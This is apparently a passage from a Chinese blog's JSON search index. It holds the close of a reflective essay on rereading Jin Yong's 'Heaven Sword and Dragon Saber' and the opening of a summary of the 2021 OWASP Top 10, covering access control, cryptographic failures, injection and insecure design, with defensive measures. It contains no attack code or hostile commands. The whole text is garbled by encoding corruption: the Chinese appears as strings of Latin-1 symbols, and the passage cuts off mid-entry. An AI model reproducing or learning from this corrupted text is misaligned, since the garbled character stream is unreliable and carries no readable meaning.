é¾™åˆ€ï¼Œç”šè‡³äºå…‰æ˜é¡¶å·è¢­å¤±è´¥è€Œåˆºæ­»äº†åå±±æ´¾æŒé—¨ã€å¤œæ™šç§é—¯å…³æŠ¼è°¢é€Šçš„åœ°æ–¹è€Œè¢«æ¸¡åŠ«ä¸‰äººå‡»è´¥ã€è¢«æˆæ˜†æ€æ­»ï¼Œè¿™æ˜¯æ­£è½¬ä¸ºé‚ªçš„ä¾‹å­ã€‚å…¶å®ï¼Œä¹¦ä¸­çš„äººç‰©å‡æ˜¯ç°åº¦çš„ï¼Œä»¥æ­£é‚ªä¸ºç™½é»‘ï¼Œå¼ ä¸‰ä¸°å’Œæˆæ˜†ä¸ºä¸¤ä¸ªæç«¯çš„äººç‰©ï¼Œå…¶ä½™äººç‰©å‡ ä¹éƒ½äº¦æ­£äº¦é‚ªã€‚å¼ æ— å¿Œä¸€èº«æ­£æ°”ï¼Œä¹Ÿéš¾å…å¯¹å››å¥³è´ªå¿ƒä¸è¶³ï¼Œæƒ…æ„Ÿçº ç¼ ä¸æ¸…ï¼Œæ˜¯å¤§æ­£è€Œå°é‚ªï¼›èµµæ•æ˜¯å®³è‹¦äº†ä¿å²±å²©ç­‰äººçš„å¹•åé»‘æ‰‹ï¼Œè€Œä¹Ÿéš¾é€ƒç”·å¥³ä¹‹æƒ…çš„å½±å“ï¼Œå‘å¼ æ— å¿Œä»£è¡¨çš„æ­£æ–¹é æ‹¢è¿‡å»ï¼›æ˜æ•™è¯¸äººæ›´ä¸å¿…æï¼Œæ€»æ˜¯ä»¥é‚ªé­…æ‰‹æ®µè¡Œæ­£ä¹‰ä¹‹äº‹ï¼Œå€’ä¹Ÿæœ‰è¶£ã€‚\nä¸»ä¸æ¬¡çš„çŸ›ç›¾å†²çªæ˜¯å¦ä¸€ä¸ªå¤§é—®é¢˜ã€‚æ–‡ç« çš„èƒŒæ™¯æ˜¯å…ƒæœ«ï¼Œä¸»è¦çŸ›ç›¾å…¶å®æ˜¯æœå»·ä¸ç™¾å§“ã€ä¸æ±Ÿæ¹–ç¾¤ä¾ çš„å†²çªï¼Œå…¶ä½™æ±Ÿæ¹–å„æ´¾ã€æ´¾å†…å„ç§äººç‰©çš„å†²çªï¼Œæ˜¯æ¬¡è¦çš„ã€‚ä½†æ˜¯å…¨æ–‡åŸºæœ¬ä»¥æ¬¡è¦çŸ›ç›¾ä¸ºæ ¸å¿ƒï¼Œæ²¡æœ‰è¿‡å¤šåœ°å‘ˆç°å½“æ—¶çš„ä¸»è¦çŸ›ç›¾ï¼Œæˆ–è€…è¯´ä¸»è¦çŸ›ç›¾åªå­˜åœ¨äºè¯¸äººçš„è±ªè¨€å£®è¯­ä¸­ï¼Œè¿™æ˜¯å—åˆ°äº†é¢˜æçš„é™åˆ¶ã€‚è®²å¸¦å…µæ‰“ä»—ã€é©±é™¤èƒ¡è™ï¼Œä¸è®²å†…åŠŸå¤–åŠ²ã€æ±Ÿæ¹–æ©æ€¨ï¼Œè¿™æ­¦ä¾ å°è¯´ä¾¿æ²¡ä¸œè¥¿å¯å†™ã€‚ä½†æ˜¯åœ¨æ¬¡è¦çŸ›ç›¾ä¹‹ä¸­ï¼Œå¤„å¤„ä½“ç°ä¸»è¦çŸ›ç›¾ï¼Œå„æ´¾ä¹‹é—´äº‰æ–—ä¹‹æ—¶ï¼Œæ€»æœ‰äººè¯•å›¾å°†è¿™äº›æ–—äº‰æ¶ˆèæ‰ï¼Œå‘¼åå„æ–¹å›¢ç»“èµ·æ¥å¯¹ä»˜å…ƒæœï¼›åœ¨æœ±å…ƒç’‹å¯¹å¼ æ— å¿Œæ–½å‹çš„å†…éƒ¨æ–—äº‰æƒ…èŠ‚ä¸­ï¼Œä¹Ÿæœ‰äººå‘¼åä»¥æŠ—å‡»å¤–è™ä¸ºä¸»ã€‚æœ€åå„æ–¹ç»ˆäºå›¢ç»“åœ¨å°‘å®¤å±±ä¸Šï¼Œå…±åŒæŠµå¾¡å…ƒå…µï¼Œæ˜¯æ¬¡è¦çŸ›ç›¾è½¬å‘ä¸»è¦çŸ›ç›¾çš„ä¸€æ¬¡å‡åã€‚\nä¸»æ¬¡çŸ›ç›¾åœ¨å„æ–¹çš„è§†è§’å½“ä¸­æ˜¯ä¸ä¸€æ ·çš„ã€‚ä»ç¬¬ä¸‰è€…è§†è§’æ¥çœ‹ï¼Œå½“ç„¶æ˜¯æ¢å¤å¤±åœ°ã€æ¨å€’æš´è™çš„æœå»·ä¸ºè¦ï¼›ä»£å…¥å„æ´¾ä¸­çš„äººç‰©æ¥çœ‹ï¼Œä¸»è¦çŸ›ç›¾å´æ˜¯æ€å®³å¸ˆå…„å¼Ÿçš„ä¸å…±æˆ´å¤©ä¹‹ä»‡æ•Œï¼Œè¿™ä¹Ÿæ— å¯åšéã€‚ç€çœ¼å¤§å±€ã€æ”¾ä¸‹ç§äººæ©æ€¨æ˜¯ä¸€ç§ä¿®ä¸ºï¼Œä¸èƒ½å¼ºè°ƒæ‰€æœ‰äººéƒ½è¦æœ‰è¿™ç§ä¿®ä¸ºï¼Œè¿™ç§å±€éƒ¨è§†è§’ä¸‹çš„ä¸»è¦çŸ›ç›¾å…¶å®æ˜¯ç­ç»å¸ˆå¤ªèº«æ­»ã€å‘¨èŠ·è‹¥æ‚²å‰§çš„ä¸€ä¸ªé‡è¦æˆå› ã€‚\nå…¶å®ï¼Œæ­£ä¸é‚ªçš„å¯¹ç«‹ç»Ÿä¸€ä¹Ÿåº”å½“å±äºè¯¸å¤šçŸ›ç›¾ä¸­çš„ä¸€ç§ã€‚æˆ‘åœ¨è¿™é‡Œè¯´çš„ç¬¬ä¸€ç‚¹å¼ºè°ƒçš„æ˜¯â€œå¯¹ç«‹å’Œç»Ÿä¸€â€ï¼Œç¬¬äºŒç‚¹å¼ºè°ƒçš„æ˜¯â€œä¸»è¦å’Œæ¬¡è¦â€ï¼Œå¹¶ä¸å±äºé‡å¤ã€‚\nè‡³äºä»å‰çš„é˜…è¯»ç†è§£é¢˜é‡Œé¢å¸¸å¸¸è¯´çš„â€œæ­Œé¢‚äº†äººç‰©çš„æŸæŸæ€§æ ¼â€ã€â€œåæ˜ äº†æŸæŸé«˜è´µå“è´¨â€äº‘äº‘ï¼Œä½†å‡¡æˆç‚¹æ°”å€™çš„å°è¯´ï¼Œä¾¿ä¸ä¼šä¸çªå‡ºäººç‰©çš„æ€§æ ¼å“è´¨ï¼Œå†™åœ¨è¿™é‡Œæ˜¯æµªè´¹ç¬”å¢¨ã€‚\nå°æƒ… å°æƒ…å®åˆ™ä¸å°ï¼Œç›¸åï¼Œä¹ƒæ˜¯ä½¿äººç‰©ä¸°æ»¡ä¹‹å…³é”®ã€‚æ²¡æœ‰å°æƒ…ï¼Œå°è¯´é‡Œå†™å‡ºæ¥çš„ä¾¿æ˜¯æœ¨å¤´è€Œä¸æ˜¯äººäº†ï¼Œä½†ç›¸æ¯”äºå®è§‚çš„ã€è¾ƒå¤§çš„é—®é¢˜ï¼Œäººç‰©èº«ä¸Šæ‰€ç³»çš„ä¸€äº›æƒ…æ„Ÿï¼Œåªèƒ½ç§°ä¹‹ä¸ºå°æƒ…ã€‚\nã€Šå€šå¤©å± é¾™è®°ã€‹çš„åè®°å½“ä¸­è®²åˆ°ï¼Œè¿™ä¸€éƒ¨å°è¯´ä¸»è¦å¼ºè°ƒçš„ä¸æ˜¯ç”·å¥³ä¹‹æƒ…ï¼Œè€Œæ˜¯æ±Ÿæ¹–å½“ä¸­çš„å¥½å‹ã€å¸ˆé•¿ä¹‹æƒ…ã€‚åœ¨æˆ‘è¯»æ¥ï¼Œå…¶å®äºŒè€…çš„å«é‡æ˜¯å·®ä¸å¤šçš„ï¼Œå¥½å‹ã€å¸ˆé•¿ä¹‹æƒ…æè¿°è™½å¤šï¼Œè€Œå…¶å‘³ä¸æµ“ï¼Œç”·å¥³ä¹‹æƒ…è™½ç„¶ä¸€ç›´å¹¶ä¸ç›´æ¥åœ°è¡¨è¾¾å‡ºæ¥ï¼Œä½†å¯¥å¯¥å‡ ä¸ªæƒ…èŠ‚ä¾¿ä»¤äººå¦‚é¥®çƒˆé…’ï¼Œæ€ç»ªæ— ç©·ã€‚\nå¥½å‹ã€å¸ˆé•¿ä¹‹æƒ…ç¡®å®æ˜¯ä¸€å¤§é‡ç‚¹ã€‚å¼ æ— å¿Œå’Œå¤ªå¸ˆå‚…ã€å’Œæ˜æ•™å½“ä¸­çš„æ•™ä¼—ã€å’Œè°¢é€Šï¼Œéƒ½æœ‰éå¸¸ä¸ä¸€èˆ¬çš„æƒ…è°Šï¼Œå¼ ä¸‰ä¸°å’Œå¼ ç¿ å±±ã€æˆ–è€…æ­¦å½“ä¸ƒä¾ ä¹‹é—´çš„æƒ…æ„Ÿï¼Œäº¦ä¸é€Šè‰²ã€‚ç”·äººæ˜¯å¾ˆå‘å¾€è¿™æ ·çš„æƒ…æ„Ÿçš„ï¼Œè€Œæ­¦ä¾ å°è¯´æ‰€æç»˜çš„è¿™ç±»æƒ…æ„Ÿå¾ˆå¤šï¼Œå› æ­¤åœ¨å›ºæœ‰çš„å°è±¡ä¸­ï¼Œå­¦ç”Ÿæ—¶æœŸç—´è¿·äºæ­¦ä¾ å°è¯´çš„ç¾¤ä½“ä¸­è¿˜æ˜¯ç”·ç”Ÿè¾ƒä¸ºå¤šä¸€äº›ã€‚\nç”·å¥³ä¹‹æƒ…çš„éƒ¨åˆ†åˆ™å½“çœŸæ˜¯åƒå›ç™¾è½¬ã€‚å¼ ç¿ å±±å’Œæ®·ç´ ç´ å¥½ä¸€å¯¹å¤©ä½œä¹‹åˆï¼å¼ æ— å¿Œå’Œå°æ˜­ã€èµµæ•ã€å‘¨èŠ·è‹¥ï¼Œæ®·ç¦»å’Œå¥¹å¿ƒä¸­çš„é‚£ä¸ªå°é¬¼â€¦â€¦è¿™ä¸€ç±»æ„Ÿæƒ…çœŸæ˜¯éå¸¸å¤æ‚ï¼Œæ— è®ºæ˜¯å–œæ˜¯æ‚²è¯»èµ·æ¥éƒ½ä½¿äººéå¸¸æƒ†æ€…ã€‚å¯»å¸¸ä½œå“å½“ä¸­å†™ç”·å¥³ä¹‹æƒ…ï¼Œèƒ½æœ‰ä¸€äºŒç¼•å¤æ‚å…³ç³»ï¼Œä¾¿å«äººéš¾ä»¥æŠŠæŒï¼Œè€Œä¹¦ä¸­è‹¥å¹²å¯¹ç”·å¥³è¢«é‡‘åº¸å…ˆç”Ÿåˆ»ç”»å¾—å¦‚æ­¤ç”ŸåŠ¨ï¼Œä¸æ„§æ˜¯ä¸€ä»£å¤§å¸ˆã€‚\næˆ‘æƒ³åœ¨è¿™ä¸€éƒ¨åˆ†ä¸­ï¼Œè°ˆè°ˆæˆ‘å¯¹è¿™éƒ¨ä½œå“çš„æ€»ä½“æ„Ÿå—å’Œä¸€äº›å…¶ä»–çš„è”æƒ³ã€‚\næ­¤å‰å·²è®²è¿‡ï¼Œã€Šå€šå¤©å± é¾™è®°ã€‹æ˜¯å¤§æƒ…å’Œå°æƒ…äº¤èåœ¨ä¸€èµ·çš„ï¼Œæ°å¦‚é‚£é˜´é˜³å¹¶æµçš„ä¹é˜³çœŸæ°”é‚£æ ·ï¼Œå¾ˆé†‡åšã€‚å°è¯´æ˜¯è¦æœ‰è¿™æ ·çš„æ°´å¹³ï¼Œæ‰å ªç§°å¥½ä½œå“ï¼›ã€Šä¸‰å›½æ¼”ä¹‰ã€‹å¦‚æ²¡æœ‰å§‹ç»ˆæ€€æŠ±â€œå…´å¤æ±‰å®¤ã€è¿˜äºæ—§éƒ½â€æ„¿æœ›çš„èœ€æ±‰ï¼Œä¾¿æ˜¯ä¸‰æ´¾å†›é˜€æ··æˆ˜ï¼Œæ— ç”šç‰¹åˆ«çš„é­…åŠ›ï¼Œè¿™éƒ¨ä½œå“ä¸­å‡Œé©¾äºä¸ªäººä¹‹ä¸Šçš„å¤§æƒ…æ˜¯å®¶å›½æƒ…æ€€ã€å›è‡£ä¹‹ä¹‰ã€‚è¯»è€…æ€»æ˜¯å¸Œæœ›ä»ä½œå“ä¸­è¯»å‡ºä¸€äº›æƒ…èŠ‚ä¹‹å¤–çš„ä¸œè¥¿ï¼Œå¦‚æ­¤æ„Ÿæ‚Ÿæ‰æ·±ã€å›å‘³æ‰éš½æ°¸ã€‚\nå°è¯´æ˜¯ä»¥å°æƒ…ç»“å°¾çš„ï¼Œå‘¨èŠ·è‹¥è¦æ±‚å¼ æ— å¿Œä¸è·Ÿèµµæ•æ‹œå ‚æˆäº²ï¼Œä½†ä¸åå¯¹ä»–ä»¬åšå¤«å¦»ï¼ŒåŸæ–‡å†™é“ï¼š\nå¼ æ— å¿Œå¥‡é“ï¼šâ€œä½ è¿™æ ·è·Ÿæˆ‘ä»¬ä¸ºéš¾ï¼Œæœ‰ä»€ä¹ˆç”¨æ„ï¼Ÿâ€å‘¨èŠ·è‹¥å«£ç„¶ä¸€ç¬‘ï¼Œè¯´é“ï¼šâ€œä½ ä»¬å°½ç®¡åšå¤«å¦»ã€ç”Ÿå¨ƒå¨ƒï¼Œè¿‡å¾—åå¹´å…«å¹´ï¼Œä½ å¿ƒé‡Œå°±åªä¼šæƒ³ç€æˆ‘ï¼Œå°±åªä¸èˆå¾—æˆ‘ï¼Œè¿™å°±å¤Ÿäº†ã€‚â€è¯´ç€èº«å½¢æ™ƒåŠ¨ï¼Œé£˜ç„¶è¿œå»ï¼Œæ²¡å…¥é»‘æš—ä¹‹ä¸­ã€‚\nè¿™æ ·ä½œä¸ºè½å¹•ï¼Œå¥½ä¸åšé“ï¼Œç•™ä¸‹çš„ç©ºé—´å®åœ¨å¤ªå¤§ï¼Œå›å‘³å®åœ¨å¤ªå¤šï¼›æˆ‘æ˜¨æ™šè¯»å®Œå…¨ä¹¦ï¼ŒçŠ¹å¦‚é¥®ä¸‹ä¸€æ¯æè‹¦æè‹¦çš„æµ“èŒ¶ï¼Œä¸€ç›´åˆ°æ·±å¤œéƒ½è¿˜è¾—è½¬åä¾§ï¼Œå…¨æ”¾ä¸ä¸‹å¯¹è¿™å‡ ä¸ªäººçš„ç‰µæŒ‚ï¼Œè®²ä¸æ¸…æ˜¯ä¸€ç§ä»€ä¹ˆæ„Ÿè§‰ã€‚\nå¾ˆå¼€å§‹çš„æ—¶å€™ä¾¿è¯´ï¼šæˆ‘æ˜¯æ¯”è¾ƒä¸å–œæ¬¢è¯»å°è¯´ï¼Œå°¤å…¶æ˜¯é•¿ç¯‡å°è¯´çš„ã€‚æˆ‘ä»¬æ—¢ç„¶è¦è¯»ä¹¦ï¼Œä¾¿è¯¥è¯»ä½³ä½œï¼Œæ—¢æ˜¯ä½³ä½œï¼Œä¾¿æ˜¯å…¶ä¸­ä¸€ä¸ªå¾®ä¸è¶³é“ä¹‹äººç‰©ï¼Œä¹Ÿè¢«ä½œè€…ç”¨æ·±åšçš„åŠŸåº•åˆ»ç”»å¾—æ ©æ ©å¦‚ç”Ÿï¼Œæ›´ä¼‘æä¸»è§’ã€‚è¯»å®Œä¸€æœ¬é•¿ç¯‡å°è¯´ï¼Œä¾¿æ˜¯ä¸ä¸»è§’ä¸€é“ç”Ÿæ´»äº†å¥½å‡ å¤©ï¼Œæƒ³ä¸»è§’ä¹‹æ‰€æƒ³ï¼Œè§ä¸»è§’ä¹‹æ‰€è§ï¼Œä»–çš„å–œæ€’å“€ä¹åªåœ¨çœ¼å‰ï¼Œå¯¹è¿™ä¸ªäººç‰©çš„æƒ…æ„Ÿå·²æ˜¯å¾ˆæ·±ï¼›è¯»å®Œå…¨æœ¬ï¼Œåˆä¸Šä¹¦é¡µï¼Œè¿™ä¸ªäººç‰©ä¾¿æ˜¯â€œé£˜ç„¶è¿œå»ï¼Œæ²¡å…¥é»‘æš—ä¹‹ä¸­â€ï¼Œäºæˆ‘æ¥è¯´ï¼Œä¸æ˜¯è¯»å®Œäº†ä¸€æœ¬ä¹¦ï¼Œè€Œæ˜¯å¤±å»äº†ä¸€ä¸ªæå¥½çš„æœ‹å‹ï¼Œæ€…æ€…ç„¶ä¸çŸ¥æ‰€æªã€‚â€œæ—©çŸ¥å¦‚æ­¤ç»Šäººå¿ƒï¼Œä½•å¦‚å½“åˆè«ç›¸è¯†â€ï¼Œæ­£æ˜¯æˆ‘ä¸å–œæ¬¢è¯»é•¿ç¯‡å°è¯´çš„åŸå› äº†ã€‚\n","date":"2021-10-10T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%86%8D%E8%AF%BB%E5%80%9A%E5%A4%A9%E5%B1%A0%E9%BE%99%E8%AE%B0/","title":"å†è¯»ã€Šå€šå¤©å± é¾™è®°ã€‹"},{"content":"2021ç‰ˆæœ¬çš„OWASP Top10å·²ç»å‡ºç‚‰ï¼Œç›®å‰å¤„äºåŒè¡Œè¯„å®¡é˜¶æ®µã€‚æœ¬åšå®¢ä¸Šå·²æœ‰2017ç‰ˆæœ¬çš„å½’çº³æ€»ç»“ï¼Œè€ƒè™‘åˆ°åé¢å‡ å¹´æ—¶é—´å†…ï¼Œè¯¥ç‰ˆæœ¬ï¼ˆ2021ç‰ˆï¼‰çš„Top10å°†å¯èƒ½å¯¹è¡Œä¸šäº§ç”Ÿè¾ƒå¤§çš„å½±å“ï¼Œç°å•åˆ—ä¸€ç¯‡ï¼Œæ€»ç»“å…¶å†…å®¹ã€‚\næˆªè‡³æœ¬æ–‡å‘å¸ƒï¼Œè¯¥ç‰ˆæœ¬å·²ç»å®šç¨¿\n0 æ€»è§ˆ æ–°ç‰ˆæœ¬ç›¸è¾ƒäº2017ç‰ˆï¼Œå¼•å…¥äº†3ä¸ªæ–°ç±»åˆ«ï¼ˆInsecure Designã€Software and Data Integrity Failuresã€SSRFï¼‰ï¼Œä¿®æ”¹äº†åŸæœ‰4ä¸ªç±»çš„åç§°ï¼Œä»¥åŠè¿›è¡Œäº†ä¸€äº›ç±»åˆ«çš„æ•´åˆã€‚\nå˜åŒ– è¿™ä¸€ç‰ˆTop10ç»¼åˆè€ƒè™‘äº†å¤§æ•°æ®å’Œè¡Œä¸šè°ƒæŸ¥çš„ç»“æœï¼›ç”±äºå®‰å…¨äººå‘˜éœ€è¦å¯¹å¤§æ•°æ®åˆ†æå¾—åˆ°çš„æ¼æ´è¿›è¡ŒéªŒè¯å’Œæµ‹è¯•ï¼Œä¸ºäº†ä¿è¯ç»“è®ºçš„ä¸æ—¶ä¿±è¿›ï¼Œè¯¥æœºæ„å¯¹ä¸€çº¿å®‰å…¨äººå‘˜è¿›è¡Œäº†é—®å·è°ƒæŸ¥ï¼Œç”±ä»–ä»¬æ¥å¯¹å¤§æ•°æ®åˆ†æçš„ç»“æœè¿›è¡Œè¡¥å……ã€‚\n1 Broken Access Control å¤±æ•ˆçš„è®¿é—®æ§åˆ¶ æ˜¯åŸæ¦œå•çš„ No. 5 ï¼Œç°åœ¨æ¥åˆ°äº†ç¬¬ä¸€ä½ã€‚åœ¨ ç§‹æ‹› | ä¸€äº›çŸ¥è¯†ç‚¹ (gitee.io) è¿™ç¯‡æ–‡ç« ä¸­å·²ç»å¯¹è¿™ä¸€å®‰å…¨é—®é¢˜è¿›è¡Œäº†è§£é‡Šï¼Œåœ¨æ­¤ä¸å¦¨å†é‡å¤ä¸€éã€‚\nè®¿é—®æ§åˆ¶ç­–ç•¥ä½¿å¾—æ‰€æœ‰ç”¨æˆ·éƒ½åªèƒ½åœ¨å…¶å¯¹åº”çš„æƒé™ä¹‹ä¸‹è¡ŒåŠ¨ï¼Œè€Œå¤±æ•ˆçš„è®¿é—®æ§åˆ¶å°†å¯¼è‡´æœªæˆæƒä¿¡æ¯çš„è¯»å–ã€ä¿®æ”¹ã€é”€æ¯ï¼Œæˆ–å¯¼è‡´ç”¨æˆ·æ‰§è¡Œå…¶æƒé™ä¹‹å¤–çš„åŠŸèƒ½å‡½æ•°ã€‚ä¸€èˆ¬çš„è®¿é—®æ§åˆ¶æ¼æ´åŒ…æ‹¬ä»¥ä¸‹å‡ ç‚¹ï¼š\næ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹URLã€åº”ç”¨å†…éƒ¨çŠ¶æ€ã€HTMLé¡µé¢æˆ–ä½¿ç”¨APIæ”»å‡»å·¥å…·æ¥ç»•è¿‡è®¿é—®æ§åˆ¶æ£€æŸ¥ï¼› å…è®¸æ”»å‡»è€…å°†æ•°æ®åº“ä¸»é”®è®¾ç½®ä¸ºå…¶ä»–ç”¨æˆ·ï¼Œä»è€Œå¯¼è‡´æŸ¥çœ‹æˆ–ä¿®æ”¹å…¶ä»–ç”¨æˆ·çš„ä¿¡æ¯ï¼› ææƒã€‚æœªç™»å½•æ—¶èƒ½å¤Ÿæ‰§è¡Œå·²ç™»å½•ç”¨æˆ·çš„æ“ä½œï¼Œæˆ–å·²ç™»å½•ç”¨æˆ·æ‰§è¡Œç®¡ç†å‘˜æ“ä½œï¼› ä¿®æ”¹å…ƒæ•°æ®ï¼Œä¾‹å¦‚JSON Web Tokenï¼ˆJWTï¼‰çš„é‡æ”¾æˆ–ä¼ªé€ ï¼Œcookieæˆ–éšè—å…ƒæ•°æ®å­—æ®µçš„ä¼ªé€ ï¼Œä»è€Œè¿›è¡Œææƒï¼› CORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰é…ç½®ä¸å½“ï¼Œä»è€Œå¯¼è‡´æœªæˆæƒçš„APIè°ƒç”¨ï¼› åœ¨æœªç™»å½•çŠ¶æ€ä¸‹é€šè¿‡ç›®å½•éå†æ‰¾åˆ°äº†éœ€è¦ç™»å½•æ‰èƒ½è®¿é—®çš„ç•Œé¢ï¼Œæˆ–åŒç†æ‰¾åˆ°äº†ç®¡ç†å‘˜ç•Œé¢ã€‚ é˜²æŠ¤æªæ–½ ï¼š\nåªå¼€æ”¾å…¬å…±èµ„æºï¼Œå…¶ä½™èµ„æºé»˜è®¤ç¦æ­¢è®¿é—®ï¼› åªå®ç°ä¸€ç§è®¿é—®æ§åˆ¶æœºåˆ¶ï¼Œè´¯å½»è½å®åˆ°æ•´ä¸ªåº”ç”¨ä¸­ï¼› è®¿é—®æ§åˆ¶æ¨¡å‹è¦æ˜ç¡®æ¯ä¸€æ¡è®°å½•çš„æ‹¥æœ‰è€…ï¼Œä¸å…è®¸ç”¨æˆ·éšä¾¿åˆ›å»ºã€è¯»å–ã€æ›´æ–°ã€åˆ é™¤è®°å½•ï¼› è®°å½•å¤±è´¥çš„è®¿é—®æ§åˆ¶ï¼Œå¹¶åŠæ—¶å‘Šè­¦ã€‚ 2 Cryptographic Failures å¯†ç ç®—æ³•å¤±æ•ˆ æ—§ç§° æ•æ„Ÿæ•°æ®æ³„éœ² ï¼Œæ˜¯åŸæ¦œå•çš„ No. 3 ï¼Œç°åœ¨æ¥åˆ°äº†ç¬¬äºŒä½ã€‚æ•æ„Ÿæ•°æ®æ³„éœ²æ˜¯ç°è±¡è€Œéæœ¬è´¨ï¼Œæ–°ç‰ˆæœ¬å°†å…¶è¡¨è¾¾ä¿®æ”¹ä¸ºæ›´åŠ æ¥è¿‘é—®é¢˜æ ¹æºçš„å½¢å¼ã€‚\näººä»¬æ€»æ˜¯éœ€è¦è€ƒè™‘æ•°æ®ä¼ è¾“ã€å­˜å‚¨ã€å¤„ç†è¿‡ç¨‹ä¸­çš„ä¿æŠ¤éœ€æ±‚ï¼Œè¯¸å¦‚å£ä»¤ã€ä¿¡ç”¨å¡å·ã€ä¸ªäººä¿¡æ¯ç­‰æ•°æ®éœ€è¦æä¾›é¢å¤–çš„ä¿æŠ¤ï¼›ä¸€èˆ¬æ¥è¯´ï¼Œåªè¦æ˜¯æ³•å¾‹è§„å®šçš„æ•æ„Ÿæ•°æ®éƒ½éœ€è¦è¿›è¡Œä¸¥å¯†çš„ä¿æŠ¤ã€‚å‚ç…§æ¬§ç›Ÿçš„GDPRã€é‡‘èä¸šçš„PCI DSSç­‰æ–‡ä»¶ï¼Œæ•°æ®ä¿æŠ¤è¦è€ƒè™‘å¦‚ä¸‹çš„é—®é¢˜ï¼š\næ•°æ®æ˜æ–‡æ˜æ–‡ä¼ è¾“é—®é¢˜ï¼› åœ¨é»˜è®¤é…ç½®æˆ–è¾ƒè€çš„ä»£ç ä¸­ä½¿ç”¨äº†è„†å¼±çš„å¯†ç ç®—æ³•ï¼› ä½¿ç”¨äº†é»˜è®¤çš„/è„†å¼±çš„/é‡å¤ä½¿ç”¨çš„å¯†é’¥ï¼Œæˆ–å¯†é’¥æ²¡æœ‰å¾—åˆ°å¦¥å–„çš„ä¿ç®¡ï¼› æ²¡æœ‰å¼ºåˆ¶è¿›è¡ŒåŠ å¯†ï¼› å®¢æˆ·ç«¯æ²¡æœ‰å¯¹æœåŠ¡ç«¯è¯ä¹¦è¿›è¡ŒéªŒè¯ã€‚ é˜²æŠ¤æªæ–½ ï¼š\nå¯¹æ²¡å¿…è¦å­˜å‚¨çš„æ•æ„Ÿæ•°æ®äºˆä»¥åŠæ—¶é”€æ¯ï¼Œå­˜å‚¨çš„æ•æ„Ÿæ•°æ®ç¡®ä¿åŠ å¯†ã€‚ ä½¿ç”¨æœ€æ–°çš„ã€å¼ºå¤§çš„ç®—æ³•ã€åè®®ã€å¯†é’¥ï¼Œä¸”å¯†é’¥å¦¥å–„ç®¡ç†ã€‚ ç¡®ä¿æ•°æ®ä¼ è¾“è¿‡ç¨‹ä¸­å—åˆ°åŠ å¯†ä¿æŠ¤ï¼Œå¦‚ä½¿ç”¨HSTSã€‚ 3 Injection 2017ç‰ˆæœ¬çš„OWASP Top10å°†æ³¨å…¥æ¼æ´æ’åœ¨ç¬¬ä¸€ä½ï¼Œå› æ­¤ç›¸ä¿¡å¾ˆå¤šäººéƒ½å¯¹æ­¤æœ‰æ‰€äº†è§£ã€‚\nä»¥ä¸‹çš„æƒ…å†µå¯èƒ½å¯¼è‡´æ³¨å…¥æ¼æ´çš„å‡ºç°ï¼š\nç”¨æˆ·æä¾›çš„æ•°æ®æ²¡æœ‰ç»è¿‡åº”ç”¨ç¨‹åºçš„éªŒè¯ã€è¿‡æ»¤ï¼› æœªç»è¿‡è½¬ä¹‰å°±å°†åŠ¨æ€è¯·æ±‚æˆ–éå‚æ•°åŒ–çš„APIè°ƒç”¨æ”¾å…¥è§£é‡Šå™¨æ‰§è¡Œï¼› æ¶æ„æ•°æ®è¢«ç›´æ¥ä½¿ç”¨æˆ–æ‹¼æ¥ä½¿ç”¨ã€‚ é˜²æŠ¤æªæ–½ ï¼š\nå°†æ•°æ®å’Œå¯æ‰§è¡Œçš„å‘½ä»¤/æŸ¥è¯¢è¯­å¥åˆ†ç¦»ã€‚ ä½¿ç”¨å®‰å…¨çš„APIï¼Œé¿å…å®Œå…¨ä½¿ç”¨è§£é‡Šå™¨ï¼Œæä¾›å‚æ•°åŒ–çš„APIè°ƒç”¨æ–¹å¼ã€‚ å¯¹è¾“å…¥è®¾ç½®ç™½åå•ï¼Œæˆ–è¿›è¡Œè¾“å…¥éªŒè¯ã€‚ è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ã€‚ åœ¨æŸ¥è¯¢ä¸­ä½¿ç”¨ LIMIT æˆ–å…¶ä»–SQLæ§ä»¶ï¼Œé˜²æ­¢SQLæ³¨å…¥æ—¶å¤§é‡åœ°æ³„éœ²è®°å½•ã€‚ 4 Insecure Design ä½ ä»æœªè§è¿‡çš„èˆ¹æ–°ç§ç±»\næ–°ç‰ˆæœ¬ä¸­æ–°å¢çš„ Insecure Design ä¸»è¦å…³æ³¨ç”±ç¨‹åºè®¾è®¡å’Œæ¶æ„ä¸Šçš„ç¼ºé™·æ‰€å¼•èµ·çš„å®‰å…¨é£é™©ï¼Œç”±æ­¤å»ºè®®äººä»¬æ›´å¤šåœ°åœ¨å·¥ç¨‹ä¸­ä½¿ç”¨å¯¹å¨èƒè¿›è¡Œå»ºæ¨¡ï¼Œä½¿ç”¨å®‰å…¨çš„è®¾è®¡æ¨¡å¼å’Œå‚è€ƒæ¶æ„ã€‚\nä¸å®‰å…¨è®¾è®¡ å…¶å®æ˜¯ä¸€ä¸ªè¾ƒä¸ºå®½æ³›çš„ç±»å‹ï¼Œå…¶ä¸‹åŒ…å«è‹¥å¹²å¸¸è§çš„è„†å¼±ç‚¹ï¼Œä½†åŸºæœ¬å¯ä»¥å½’çº³ä¸ºâ€œç¼ºå¤±æˆ–æ— æ•ˆçš„æ§åˆ¶è®¾è®¡â€ï¼ˆmissing or ineffective control designï¼‰ã€‚\né˜²æŠ¤æªæ–½ ï¼š\nä¸å®‰å…¨ä¸“å®¶ä¸€èµ·å»ºç«‹å¹¶ä½¿ç”¨å®‰å…¨çš„å¼€å‘æµç¨‹ï¼Œå¯¹ç°æœ‰çš„å®‰å…¨æˆ–æ•æ„Ÿæ•°æ®ç›¸å…³çš„æ§åˆ¶æªæ–½è¿›è¡Œè¯„ä¼°ã€‚ åœ¨å®‰å…¨çš„æ¨¡å¼ä¸‹æ„å»ºå¹¶ä½¿ç”¨åº“/ç»„ä»¶ã€‚ å¯¹é‡è¦çš„è®¤è¯ã€è®¿é—®æ§åˆ¶ã€ä¸šåŠ¡é€»è¾‘ã€å…³é”®æµç¨‹ç­‰æ¨¡å—è¿›è¡Œ å¨èƒå»ºæ¨¡ ã€‚ ç¼–å†™å•å…ƒå’Œé›†æˆæµ‹è¯•ï¼Œä»¥éªŒè¯æ‰€æœ‰å…³é”®æµç¨‹æ˜¯å¦èƒ½å¤ŸæŠµæŠ—å¨èƒã€‚ 5 Security Misconfiguration ä¸å®‰å…¨çš„é…ç½® æ˜¯åŸæ¦œå•çš„ No. 6 